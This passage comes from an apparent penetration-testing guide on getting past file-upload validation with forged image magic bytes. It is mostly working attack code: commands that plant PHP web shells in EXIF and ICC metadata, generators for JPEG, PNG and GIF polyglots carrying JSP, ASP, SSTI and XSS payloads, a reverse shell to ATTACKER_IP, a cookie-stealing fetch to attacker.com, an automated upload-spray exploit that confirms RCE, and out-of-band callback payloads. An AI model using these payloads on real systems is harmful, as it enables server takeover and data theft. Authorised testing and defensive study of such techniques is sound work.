  data += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
  data += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
  data += b'\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x7b\x40'
  data += b'\xff\xd9'
  open('base.jpg','wb').write(data)
  "

  # ── Inject into different EXIF fields ──

  # Comment field
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' base.jpg -o exif_comment.php.jpg

  # DocumentName field
  exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' base.jpg -o exif_docname.php.jpg

  # ImageDescription field
  exiftool -ImageDescription='<?php system($_GET["cmd"]); ?>' base.jpg -o exif_desc.php.jpg

  # Artist field
  exiftool -Artist='<?php system($_GET["cmd"]); ?>' base.jpg -o exif_artist.php.jpg

  # Copyright field
  exiftool -Copyright='<?php system($_GET["cmd"]); ?>' base.jpg -o exif_copyright.php.jpg

  # UserComment field
  exiftool -UserComment='<?php system($_GET["cmd"]); ?>' base.jpg -o exif_usercomment.php.jpg

  # XPComment (Windows)
  exiftool -XPComment='<?php system($_GET["cmd"]); ?>' base.jpg -o exif_xpcomment.php.jpg

  # GPS field (creative hiding)
  exiftool -GPSAreaInformation='<?php system($_GET["cmd"]); ?>' base.jpg -o exif_gps.php.jpg

  # Multiple fields simultaneously
  exiftool \
    -Comment='<?php system($_GET["cmd"]); ?>' \
    -Artist='<?php eval($_POST["e"]); ?>' \
    -Copyright='<?=`$_GET[c]`?>' \
    base.jpg -o exif_multi.php.jpg

  # ── Verify injection ──
  exiftool exif_comment.php.jpg | grep -i "comment"
  strings exif_comment.php.jpg | grep "php"

  # ── Inject into PNG EXIF ──
  convert -size 1x1 xc:white base.png 2>/dev/null || \
    python3 -c "open('base.png','wb').write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82')"

  exiftool -Comment='<?php system($_GET["cmd"]); ?>' base.png -o exif_png.php.png

  # ── Inject into GIF ──
  convert -size 1x1 xc:white base.gif 2>/dev/null || \
    echo -ne 'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b' > base.gif

  exiftool -Comment='<?php system($_GET["cmd"]); ?>' base.gif -o exif_gif.php.gif

  echo "[+] All EXIF-injected payloads generated"
  ls -la exif_*.php.*
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="ImageMagick Injection"}
  ```bash
  # ── Using ImageMagick to create valid images with embedded payloads ──

  # Create valid JPEG with PHP in comment
  convert -size 1x1 xc:white -set comment '<?php system($_GET["cmd"]); ?>' shell_comment.jpg
  file shell_comment.jpg
  strings shell_comment.jpg | grep php

  # Create valid PNG with text chunk
  convert -size 1x1 xc:white -set 'Comment' '<?php system($_GET["cmd"]); ?>' shell_comment.png

  # Create image with payload in profile data
  echo '<?php system($_GET["cmd"]); ?>' > payload.txt
  convert -size 1x1 xc:white -profile payload.txt shell_profile.jpg

  # Create with XMP metadata
  convert -size 1x1 xc:white \
    -define xmp:Description='<?php system($_GET["cmd"]); ?>' \
    shell_xmp.jpg

  # Resize existing image (keeps EXIF data)
  convert existing_image.jpg -resize 100x100 \
    -set comment '<?php system($_GET["cmd"]); ?>' \
    resized_shell.jpg

  # ── Create polyglot that survives re-encoding ──
  # Embed payload in ICC color profile (survives most image processing)
  python3 -c "
  # Create a fake ICC profile containing PHP payload
  payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
  # ICC profile header
  icc = b'\x00' * 128
  icc = bytearray(icc)
  icc[36:40] = b'acsp'  # ICC signature
  icc[0:4] = len(icc).to_bytes(4, 'big')  # Profile size
  # Append payload after valid ICC structure
  icc.extend(payload)
  icc[0:4] = len(icc).to_bytes(4, 'big')
  open('payload.icc','wb').write(bytes(icc))
  "
  convert -size 100x100 xc:red -profile payload.icc icc_shell.jpg
  strings icc_shell.jpg | grep php
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="Jhead / wrjpgcom"}
  ```bash
  # ── Alternative EXIF/comment injection tools ──

  # wrjpgcom — write JPEG comment
  echo '<?php system($_GET["cmd"]); ?>' | wrjpgcom base.jpg > shell_wrjpg.jpg

  # jhead — JPEG header manipulation
  cp base.jpg shell_jhead.jpg
  jhead -cl '<?php system($_GET["cmd"]); ?>' shell_jhead.jpg

  # ── Python Pillow-based EXIF injection ──
  python3 -c "
  from PIL import Image
  from PIL.ExifTags import Base as ExifTags
  import piexif
  import io

  # Create valid image
  img = Image.new('RGB', (1, 1), color='white')

  # Build EXIF data with payload
  exif_dict = {
      '0th': {
          piexif.ImageIFD.ImageDescription: b'<?php system(\$_GET[\"cmd\"]); ?>',
          piexif.ImageIFD.Artist: b'<?php eval(\$_POST[\"e\"]); ?>',
          piexif.ImageIFD.Copyright: b'<?=\`\$_GET[c]\`?>',
          piexif.ImageIFD.DocumentName: b'<?php passthru(\$_GET[\"cmd\"]); ?>',
      },
      'Exif': {
          piexif.ExifIFD.UserComment: b'ASCII\x00\x00\x00<?php system(\$_GET[\"cmd\"]); ?>',
      },
      '1st': {},
      'thumbnail': None,
      'GPS': {}
  }

  exif_bytes = piexif.dump(exif_dict)
  img.save('pillow_exif.jpg', 'JPEG', exif=exif_bytes)
  print('[+] Created pillow_exif.jpg with EXIF payload')
  " 2>/dev/null || echo "Install: pip3 install Pillow piexif"
  ```
  :::
::

---

## Polyglot File Techniques

::caution
Polyglot files are valid in multiple formats simultaneously. They pass strict file parsing while containing executable payloads. This is the most advanced magic byte forgery technique.
::

### JPEG-PHP Polyglot

::tabs
  :::tabs-item{icon="i-lucide-combine" label="Full Valid JPEG + PHP"}
  ```python [jpeg_php_polyglot.py]
  #!/usr/bin/env python3
  """
  Create a file that is simultaneously a valid JPEG image
  AND valid PHP code. The PHP interpreter ignores binary data
  outside <?php ?> tags, while image viewers see valid JPEG.
  """
  import struct
  import zlib

  def create_jpeg_php_polyglot(output_path, php_code):
      """Create JPEG/PHP polyglot using JPEG comment segment"""
      payload = php_code.encode() if isinstance(php_code, str) else php_code

      # SOI (Start of Image)
      data = b'\xff\xd8'

      # APP0 (JFIF header)
      app0_data = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
      data += b'\xff\xe0' + struct.pack('>H', len(app0_data) + 2) + app0_data

      # COM (Comment) segment — contains PHP payload
      # PHP will find <?php and execute it; JPEG viewers treat it as comment
      data += b'\xff\xfe' + struct.pack('>H', len(payload) + 2) + payload

      # DQT (Quantization table) — required for valid JPEG
      qt = bytes([
          0x10, 0x0b, 0x0c, 0x0e, 0x0c, 0x0a, 0x10, 0x0e,
          0x0d, 0x0e, 0x12, 0x11, 0x10, 0x13, 0x18, 0x28,
          0x1a, 0x18, 0x16, 0x16, 0x18, 0x31, 0x23, 0x25,
          0x1d, 0x28, 0x3a, 0x33, 0x3d, 0x3c, 0x39, 0x33,
          0x38, 0x37, 0x40, 0x48, 0x5c, 0x4e, 0x40, 0x44,
          0x57, 0x45, 0x37, 0x38, 0x50, 0x6d, 0x51, 0x57,
          0x5f, 0x62, 0x67, 0x68, 0x67, 0x3e, 0x4d, 0x71,
          0x79, 0x70, 0x64, 0x78, 0x5c, 0x65, 0x67, 0x63
      ])
      data += b'\xff\xdb' + struct.pack('>H', len(qt) + 3) + b'\x00' + qt

      # SOF0 (Start of Frame) — 1x1, 8-bit, 1 component
      sof = struct.pack('>BHHB', 8, 1, 1, 1)  # precision, height, width, components
      sof += b'\x01\x11\x00'  # Component 1: Y, sampling 1x1, quant table 0
      data += b'\xff\xc0' + struct.pack('>H', len(sof) + 2) + sof

      # DHT (Huffman table) — minimal DC table
      dht = b'\x00'  # DC table 0
      dht += bytes([0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])  # bit counts
      dht += b'\x00'  # symbol
      data += b'\xff\xc4' + struct.pack('>H', len(dht) + 2) + dht

      # SOS (Start of Scan)
      sos = b'\x01\x01\x00\x00\x3f\x00'
      data += b'\xff\xda' + struct.pack('>H', len(sos) + 2) + sos

      # Minimal scan data
      data += b'\x7b\x40'

      # EOI (End of Image)
      data += b'\xff\xd9'

      with open(output_path, 'wb') as f:
          f.write(data)

      print(f"[+] JPEG/PHP polyglot: {output_path} ({len(data)} bytes)")
      return data

  # ── Generate polyglot variants ──
  shells = {
      "polyglot_system.php.jpg": '<?php system($_GET["cmd"]); ?>',
      "polyglot_eval.php.jpg": '<?php eval($_POST["e"]); ?>',
      "polyglot_passthru.php.jpg": '<?php passthru($_GET["cmd"]); ?>',
      "polyglot_minimal.php.jpg": '<?=`$_GET[c]`?>',
      "polyglot_shell_exec.php.jpg": '<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>',
      "polyglot_reverse.php.jpg": '<?php $s=fsockopen("ATTACKER_IP",4444);$p=proc_open("/bin/bash",array(0=>$s,1=>$s,2=>$s),$x); ?>',
      "polyglot_base64.php.jpg": '<?php eval(base64_decode($_POST["e"])); ?>',
      "polyglot_file_read.php.jpg": '<?php echo file_get_contents($_GET["f"]); ?>',
  }

  for filename, shell in shells.items():
      create_jpeg_php_polyglot(filename, shell)
  ```
  :::

  :::tabs-item{icon="i-lucide-combine" label="PNG-PHP Polyglot"}
  ```python [png_php_polyglot.py]
  #!/usr/bin/env python3
  """
  PNG/PHP polyglot — valid PNG with PHP in tEXt chunk
  Survives many image validation checks
  """
  import struct
  import zlib

  def create_png_chunk(chunk_type, data):
      """Create a properly formatted PNG chunk with CRC"""
      chunk = chunk_type + data
      crc = struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)
      return struct.pack('>I', len(data)) + chunk + crc

  def create_png_php_polyglot(output_path, php_code):
      payload = php_code.encode() if isinstance(php_code, str) else php_code

      # PNG signature
      data = b'\x89PNG\r\n\x1a\n'

      # IHDR chunk (1x1, 8-bit RGBA)
      ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 6, 0, 0, 0)
      data += create_png_chunk(b'IHDR', ihdr_data)

      # tEXt chunk (PHP payload hidden in text metadata)
      text_data = b'Comment\x00' + payload
      data += create_png_chunk(b'tEXt', text_data)

      # iTXt chunk (alternative text storage)
      itxt_data = b'Description\x00\x00\x00\x00\x00' + payload
      data += create_png_chunk(b'iTXt', itxt_data)

      # IDAT chunk (actual pixel data — 1 transparent pixel)
      raw_scanline = b'\x00\x00\x00\x00\x00'  # filter=none, RGBA=(0,0,0,0)
      compressed = zlib.compress(raw_scanline)
      data += create_png_chunk(b'IDAT', compressed)

      # IEND chunk
      data += create_png_chunk(b'IEND', b'')

      with open(output_path, 'wb') as f:
          f.write(data)

      print(f"[+] PNG/PHP polyglot: {output_path} ({len(data)} bytes)")

  create_png_php_polyglot("polyglot.png.php", '<?php system($_GET["cmd"]); ?>')
  create_png_php_polyglot("polyglot_eval.png.php", '<?php eval($_POST["e"]); ?>')
  ```
  :::

  :::tabs-item{icon="i-lucide-combine" label="GIF-PHP Polyglot"}
  ```bash
  # ── GIF/PHP polyglot — simplest to create ──

  # Method 1: Inline (GIF89a is valid ASCII that PHP ignores)
  cat > polyglot.gif.php << 'POLYEOF'
  GIF89a<?php system($_GET["cmd"]); ?>
  POLYEOF

  # Method 2: Full valid GIF structure
  python3 -c "
  gif = bytearray()
  # GIF89a header
  gif += b'GIF89a'
  # Logical screen descriptor (1x1)
  gif += b'\x01\x00\x01\x00\x80\x00\x00'
  # Global color table (2 colors)
  gif += b'\xff\xff\xff\x00\x00\x00'
  # Comment extension containing PHP
  payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
  gif += b'\x21\xfe'  # Comment extension
  # Split payload into sub-blocks (max 255 bytes each)
  for i in range(0, len(payload), 255):
      block = payload[i:i+255]
      gif += bytes([len(block)]) + block
  gif += b'\x00'  # Block terminator
  # Image descriptor
  gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00'
  # Image data
  gif += b'\x02\x02\x44\x01\x00'
  # GIF trailer
  gif += b'\x3b'
  open('polyglot_full.gif.php','wb').write(gif)
  print(f'[+] Created polyglot_full.gif.php ({len(gif)} bytes)')
  "

  # Verify it's a valid GIF
  file polyglot.gif.php
  # Output: polyglot.gif.php: GIF image data, version 89a, 1 x 1

  # Verify PHP code is present
  strings polyglot.gif.php | grep php
  ```
  :::

  :::tabs-item{icon="i-lucide-combine" label="Multi-Format Polyglots"}
  ```python [multi_polyglot.py]
  #!/usr/bin/env python3
  """Generate polyglots for multiple server-side languages"""
  import struct

  JPEG_HDR = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  GIF_HDR = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00'
  PNG_HDR = b'\x89PNG\r\n\x1a\n'
  BMP_HDR = b'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00' + b'\x00' * 16

  polyglots = {
      # PHP variants
      "gif_php_system.gif":     GIF_HDR + b'<?php system($_GET["cmd"]); ?>',
      "gif_php_eval.gif":       GIF_HDR + b'<?php eval($_POST["e"]); ?>',
      "gif_php_minimal.gif":    GIF_HDR + b'<?=`$_GET[c]`?>',
      "gif_php_b64.gif":        GIF_HDR + b'<?php eval(base64_decode($_POST["e"])); ?>',
      "gif_php_assert.gif":     GIF_HDR + b'<?php @assert($_REQUEST["cmd"]); ?>',
      "jpg_php_system.jpg":     JPEG_HDR + b'\xff\xfe\x00\x30<?php system($_GET["cmd"]); ?>',
      "png_php_system.png":     PNG_HDR + b'<?php system($_GET["cmd"]); ?>',
      "bmp_php_system.bmp":     BMP_HDR + b'<?php system($_GET["cmd"]); ?>',

      # JSP
      "gif_jsp.gif":            GIF_HDR + b'<%@ page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(c);Scanner s=new Scanner(p.getInputStream());while(s.hasNext())out.println(s.nextLine());}%>',

      # ASP Classic
      "gif_asp.gif":            GIF_HDR + b'<%eval request("cmd")%>',

      # ASPX
      "gif_aspx.gif":           GIF_HDR + b'<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd());%>',

      # SSI (Server Side Includes)
      "gif_ssi.gif":            GIF_HDR + b'<!--#exec cmd="id"-->',

      # ColdFusion
      "gif_cfm.gif":            GIF_HDR + b'<cfexecute name="/bin/id" variable="o" timeout="5"/><cfoutput>#o#</cfoutput>',

      # Python (Jinja2/Mako SSTI)
      "gif_ssti.gif":           GIF_HDR + b'{{config.__class__.__init__.__globals__["os"].popen(request.args.get("cmd","id")).read()}}',

      # XSS payloads in image
      "gif_xss.gif":            GIF_HDR + b'<script>alert(document.domain)</script>',
      "gif_xss_img.gif":        GIF_HDR + b'"><img src=x onerror=alert(document.domain)>',
      "gif_xss_fetch.gif":      GIF_HDR + b'<script>fetch("//attacker.com/steal?c="+document.cookie)</script>',
  }

  for name, content in polyglots.items():
      with open(name, 'wb') as f:
          f.write(content)
      print(f"[+] {name:40s} ({len(content):5d} bytes)")

  print(f"\n[+] Generated {len(polyglots)} polyglot files")
  ```
  :::
::

---

## Delivery & Upload Testing

### Automated Upload Exploitation

::tabs
  :::tabs-item{icon="i-lucide-upload" label="cURL Mass Upload"}
  ```bash
  # ── Upload all crafted payloads and track results ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=AUTH_TOKEN"
  FIELD="file"
  VERIFY_BASE="https://target.com/uploads"

  echo "═══ Magic Byte Upload Spray ═══"

  # Generate payloads first
  printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > /tmp/jpg_shell.php
  printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > /tmp/png_shell.php
  echo -n 'GIF89a<?php system($_GET["cmd"]); ?>' > /tmp/gif_shell.php
  printf 'BM<?php system($_GET["cmd"]); ?>' > /tmp/bmp_shell.php

  # ── Test 1: Extension + Magic Byte combos ──
  for payload in /tmp/*_shell.php; do
      BASE=$(basename "$payload" .php)
      MAGIC=$(echo "$BASE" | cut -d_ -f1)

      # With PHP extension
      for ext in php phtml php5 pHp PHP php7 pHP phps php4 pht pgif shtml; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@${payload};filename=avatar.${ext}" \
            -H "Cookie: $COOKIE")
          [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: ${MAGIC} magic + .${ext} extension"
      done

      # Double extension
      for ext1 in php phtml php5; do
          for ext2 in jpg jpeg png gif bmp; do
              STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
                -F "${FIELD}=@${payload};filename=avatar.${ext1}.${ext2}" \
                -H "Cookie: $COOKIE")
              [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: ${MAGIC} magic + .${ext1}.${ext2}"

              STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
                -F "${FIELD}=@${payload};filename=avatar.${ext2}.${ext1}" \
                -H "Cookie: $COOKIE")
              [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: ${MAGIC} magic + .${ext2}.${ext1}"
          done
      done

      # Image extension only (relies on server misconfiguration)
      for ext in jpg jpeg png gif bmp; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@${payload};filename=avatar.${ext}" \
            -H "Cookie: $COOKIE")
          [ "$STATUS" = "200" ] && echo "[~] ACCEPTED (img ext): ${MAGIC} magic + .${ext}"
      done
  done

  # ── Test 2: Content-Type manipulation ──
  for ct in "image/jpeg" "image/png" "image/gif" "image/bmp" "application/octet-stream" "image/x-png" "image/pjpeg"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/gif_shell.php;type=${ct};filename=shell.php" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: GIF magic + .php + Content-Type: ${ct}"
  done

  # Cleanup
  rm -f /tmp/*_shell.php
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Python Exploit Script"}
  ```python [magic_upload_exploit.py]
  #!/usr/bin/env python3
  """
  Automated magic byte upload bypass exploitation
  Tests multiple combinations of magic bytes, extensions, and content types
  """
  import requests
  import urllib3
  import time
  import sys
  import os
  urllib3.disable_warnings()

  class MagicByteExploit:
      def __init__(self, target_url, field="file", cookies=None, headers=None):
          self.target_url = target_url
          self.field = field
          self.session = requests.Session()
          self.session.verify = False
          if cookies:
              self.session.cookies.update(cookies)
          if headers:
              self.session.headers.update(headers)
          self.results = []

      MAGIC_HEADERS = {
          "jpeg": b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
          "jpeg_exif": b'\xff\xd8\xff\xe1',
          "png": b'\x89PNG\r\n\x1a\n',
          "gif87a": b'GIF87a',
          "gif89a": b'GIF89a',
          "bmp": b'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00',
          "tiff_le": b'\x49\x49\x2a\x00',
          "tiff_be": b'\x4d\x4d\x00\x2a',
          "webp": b'RIFF\x00\x00\x00\x00WEBP',
          "ico": b'\x00\x00\x01\x00\x01\x00',
          "pdf": b'%PDF-1.4\n',
          "psd": b'8BPS\x00\x01',
      }

      EXEC_EXTENSIONS = [
          "php", "phtml", "php5", "php7", "pHp", "PHP", "pht", "phps",
          "php4", "pgif", "shtml", "phar", "inc",
          "jsp", "jspx", "jsw", "jsv",
          "asp", "aspx", "asa", "cer", "ashx", "asmx",
          "cfm", "cfml",
      ]

      ALLOWED_EXTENSIONS = ["jpg", "jpeg", "png", "gif", "bmp", "ico", "webp", "tiff", "pdf"]

      CONTENT_TYPES = [
          "image/jpeg", "image/png", "image/gif", "image/bmp",
          "image/webp", "image/tiff", "image/x-icon",
          "application/octet-stream", "image/pjpeg", "image/x-png",
      ]

      def craft_payload(self, magic_type, shell_code):
          """Prepend magic bytes to shell code"""
          header = self.MAGIC_HEADERS.get(magic_type, b'')
          payload = shell_code.encode() if isinstance(shell_code, str) else shell_code
          return header + payload

      def upload(self, content, filename, content_type="application/octet-stream"):
          """Upload a single file"""
          files = {self.field: (filename, content, content_type)}
          try:
              r = self.session.post(self.target_url, files=files, timeout=15)
              return r
          except Exception as e:
              return None

      def check_shell(self, base_url, filename, cmd="id"):
          """Check if uploaded shell is accessible and executable"""
          paths = [
              f"{base_url}/{filename}",
              f"{base_url}/uploads/{filename}",
              f"{base_url}/images/{filename}",
              f"{base_url}/media/{filename}",
              f"{base_url}/files/{filename}",
              f"{base_url}/static/{filename}",
              f"{base_url}/assets/{filename}",
              f"{base_url}/content/{filename}",
              f"{base_url}/attachments/{filename}",
          ]
          for path in paths:
              try:
                  for param in ["cmd", "c", "command", "exec"]:
                      r = self.session.get(path, params={param: cmd}, timeout=5)
                      if "uid=" in r.text or "root" in r.text.lower():
                          return path, param, r.text
              except:
                  continue
          return None, None, None

      def spray(self, shell_code='<?php echo "MAGIC_BYTE_POC"; system($_GET["cmd"]); ?>', delay=0.3):
          """Test all magic byte + extension + content-type combinations"""
          total = 0
          accepted = 0

          print(f"[*] Target: {self.target_url}")
          print(f"[*] Field: {self.field}")
          print("-" * 70)

          for magic_name, magic_bytes in self.MAGIC_HEADERS.items():
              content = self.craft_payload(magic_name, shell_code)

              # Direct executable extensions
              for ext in self.EXEC_EXTENSIONS:
                  for ct in self.CONTENT_TYPES[:4]:
                      filename = f"avatar_{magic_name}.{ext}"
                      r = self.upload(content, filename, ct)
                      total += 1

                      if r and r.status_code == 200:
                          success_indicators = any(w in r.text.lower() for w in
                              ["success", "uploaded", "saved", "created", "url", "path", "filename"])
                          if success_indicators:
                              accepted += 1
                              print(f"[+] ACCEPTED: {magic_name} + .{ext} + {ct}")
                              self.results.append({
                                  "magic": magic_name, "ext": ext,
                                  "ct": ct, "filename": filename,
                                  "response": r.text[:200]
                              })

                      time.sleep(delay)

              # Double extensions
              for exec_ext in ["php", "phtml", "jsp", "asp", "aspx"]:
                  for safe_ext in ["jpg", "png", "gif"]:
                      for order in [f"{exec_ext}.{safe_ext}", f"{safe_ext}.{exec_ext}"]:
                          filename = f"avatar_{magic_name}.{order}"
                          r = self.upload(content, filename, "image/jpeg")
                          total += 1

                          if r and r.status_code == 200:
                              success_indicators = any(w in r.text.lower() for w in
                                  ["success", "uploaded", "saved"])
                              if success_indicators:
                                  accepted += 1
                                  print(f"[+] ACCEPTED (dbl ext): {magic_name} + .{order}")
                                  self.results.append({
                                      "magic": magic_name, "ext": order,
                                      "ct": "image/jpeg", "filename": filename,
                                      "response": r.text[:200]
                                  })

                          time.sleep(delay)

          print(f"\n{'='*70}")
          print(f"[*] Total requests: {total}")
          print(f"[+] Accepted uploads: {accepted}")
          if self.results:
              print(f"\n[+] Successful combinations:")
              for r in self.results:
                  print(f"    Magic: {r['magic']:12s} | Ext: {r['ext']:15s} | CT: {r['ct']}")

          return self.results


  if __name__ == "__main__":
      exploit = MagicByteExploit(
          target_url="https://target.com/api/upload",
          field="file",
          cookies={"session": "AUTH_TOKEN"},
      )

      results = exploit.spray(delay=0.5)

      # Check each successful upload for shell access
      if results:
          print(f"\n[*] Checking for shell access...")
          for r in results:
              path, param, output = exploit.check_shell(
                  "https://target.com", r["filename"]
              )
              if path:
                  print(f"[!!!] RCE CONFIRMED: {path}?{param}=id")
                  print(f"      Output: {output[:100]}")
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Burp Suite Workflow"}
  ```text
  # ── Burp Suite Magic Byte Upload Testing ──

  # 1. CAPTURE normal upload request in Proxy

  # 2. Send to REPEATER — identify:
  #    - Form field name (e.g., "file", "avatar", "upload")
  #    - Content-Type in multipart boundary
  #    - Filename parameter
  #    - Response on success vs failure

  # 3. REPEATER — Manual magic byte tests:

  # Step A: Replace file content with GIF magic + PHP shell
  # In hex view, set body to:
  # 47 49 46 38 39 61 3C 3F 70 68 70 20 73 79 73 74 65 6D ...
  # (GIF89a<?php system...)

  # Step B: Change filename to test extensions:
  # filename="shell.php"
  # filename="shell.phtml"
  # filename="shell.php.jpg"
  # filename="shell.jpg.php"
  # filename="shell.php5"

  # Step C: Change Content-Type header:
  # Content-Type: image/gif
  # Content-Type: image/jpeg
  # Content-Type: application/octet-stream

  # 4. INTRUDER — Automated extension fuzzing:
  #    Attack type: Sniper
  #    Position: filename="shell.§php§"
  #    Payloads: php,phtml,php5,pHp,PHP,php7,pht,pgif,shtml,phar,
  #              php.jpg,jpg.php,php.png,png.php,php%00.jpg,
  #              php5.jpg,phtml.jpg

  # 5. INTRUDER — Content-Type fuzzing:
  #    Position: Content-Type: §image/jpeg§
  #    Payloads: image/jpeg,image/png,image/gif,application/octet-stream,
  #              image/x-png,image/pjpeg,text/plain

  # 6. INTRUDER — Cluster Bomb (extension × content-type):
  #    Position 1: filename="shell.§php§"
  #    Position 2: Content-Type: §image/jpeg§

  # 7. After successful upload, verify shell in REPEATER:
  #    GET /uploads/shell.php?cmd=id HTTP/1.1
  #    Look for "uid=" in response
  ```
  :::
::

### Shell Access Verification

::code-group
```bash [Verify Uploaded Shell]
# ── Comprehensive shell verification ──

TARGET="https://target.com"
UPLOADED_FILENAME="shell.php"

# Common upload directories to check
DIRS=(
    "" "uploads" "images" "media" "files" "static"
    "assets" "content" "attachments" "tmp" "temp"
    "upload" "img" "data" "public" "storage"
    "user-content" "user-uploads" "avatar" "profile"
    "wp-content/uploads" "sites/default/files"
)

echo "[*] Checking uploaded shell accessibility..."

for dir in "${DIRS[@]}"; do
    if [ -z "$dir" ]; then
        URL="${TARGET}/${UPLOADED_FILENAME}"
    else
        URL="${TARGET}/${dir}/${UPLOADED_FILENAME}"
    fi

    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)

    if [ "$STATUS" = "200" ]; then
        # Check if it executes PHP
        RESULT=$(curl -s "${URL}?cmd=id" 2>/dev/null)
        if echo "$RESULT" | grep -q "uid="; then
            echo "[+] RCE CONFIRMED: ${URL}?cmd=id"
            echo "    Output: $(echo "$RESULT" | grep "uid=" | head -1)"
        else
            echo "[~] File exists but may not execute: ${URL}"
        fi
    elif [ "$STATUS" = "403" ]; then
        echo "[!] File exists but forbidden: ${URL}"
    fi
done
```

```bash [OOB Verification]
# ── Out-of-Band verification when direct access fails ──

COLLAB="YOUR_BURP_COLLAB_ID.oastify.com"

# PHP OOB via DNS
printf '\xFF\xD8\xFF\xE0<?php file_get_contents("http://'$COLLAB'/magic_byte_poc"); ?>' > oob_shell.php.jpg
curl -X POST https://target.com/api/upload \
  -F "file=@oob_shell.php.jpg" \
  -H "Cookie: session=TOKEN"
# Check Burp Collaborator for DNS/HTTP callback

# PHP OOB via curl
printf '\xFF\xD8\xFF\xE0<?php system("curl http://'$COLLAB'/?pwned=$(whoami)"); ?>' > oob_curl.php.jpg
curl -X POST https://target.com/api/upload \
  -F "file=@oob_curl.php.jpg" \
  -H "Cookie: session=TOKEN"

# PHP OOB via DNS lookup
printf '\xFF\xD8\xFF\xE0<?php $x=exec("whoami"); dns_get_record("$x.'$COLLAB'",DNS_A); ?>' > oob_dns.php.jpg
curl -X POST https://target.com/api/upload \
  -F "file=@oob_dns.php.jpg" \
  -H "Cookie: session=TOKEN"

# Time-based verification
printf '\xFF\xD8\xFF\xE0<?php sleep(10); echo "delayed"; ?>' > time_shell.php.jpg
curl -X POST https://target.com/api/upload \
  -F "file=@time_shell.php.jpg" \
  -H "Cookie: session=TOKEN"
# Access and measure response time
time curl -s "https://target.com/uploads/time_shell.php.jpg"
# If ~10 seconds → PHP executed
```
::

---

## Advanced Bypass Techniques

### Bypassing Image Re-encoding

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Surviving GD Library Processing"}
  ```python [gd_bypass.py]
  #!/usr/bin/env python3
  """
  Create images that retain PHP payload after GD library re-encoding.
  The PHP code is embedded in pixel data that survives imagecreatefromjpeg()
  and imagejpeg() re-encoding cycles.
  """
  from PIL import Image
  import struct
  import io
  import sys

  def embed_in_pixels(php_code, width=100, height=100):
      """
      Embed PHP code in IDAT pixel data of PNG.
      After re-encoding, some pixel data patterns survive.
      """
      img = Image.new('RGB', (width, height), color='white')
      pixels = img.load()

      payload = php_code.encode()
      idx = 0

      # Spread payload across pixel RGB values
      for y in range(height):
          for x in range(width):
              if idx < len(payload):
                  r = payload[idx] if idx < len(payload) else 0
                  g = payload[idx + 1] if idx + 1 < len(payload) else 0
                  b = payload[idx + 2] if idx + 2 < len(payload) else 0
                  pixels[x, y] = (r, g, b)
                  idx += 3
              else:
                  pixels[x, y] = (255, 255, 255)

      # Save as high-quality JPEG (minimize compression artifacts)
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=100, subsampling=0)
      return buf.getvalue()

  def create_comment_survivor(php_code):
      """
      Some re-encoding functions preserve EXIF/COM segments.
      Create JPEG with payload in COM that might survive processing.
      """
      img = Image.new('RGB', (100, 100), color='red')

